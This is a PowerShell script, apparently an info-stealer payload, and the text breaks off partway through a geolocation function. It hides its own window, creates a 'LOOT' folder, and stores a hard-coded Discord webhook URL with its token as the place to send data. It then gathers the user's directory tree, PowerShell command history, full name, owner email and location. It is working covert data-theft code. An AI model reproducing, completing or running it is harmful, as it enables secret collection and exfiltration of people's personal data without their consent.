# Hide window
$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $i -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)

# Make loot folder, file, and zip
$FolderName = "$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm)"
$FileName = "$FolderName.txt"
$ZIP = "$FolderName.zip"
New-Item -Path $env:tmp\$FolderName -ItemType Directory | Out-Null

# Enter your access tokens below
#$db = ""
$dc = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY"

# Recon all User Directories
tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination $env:TEMP\$FolderName\Powershell-History.txt -ErrorAction SilentlyContinue

function Get-fullName {
    try {
        $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
        return $fullName
    } catch {
        Write-Error "No name was detected"
        return $env:UserName
    }
}

function Get-email {
    try {
        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
        return $email
    } catch {
        Write-Error "An email was not found"
        return "No Email Detected"
    }
}

function Get-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()
        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100
        }
        if ($GeoWatcher.Permission -eq 'Denied') {
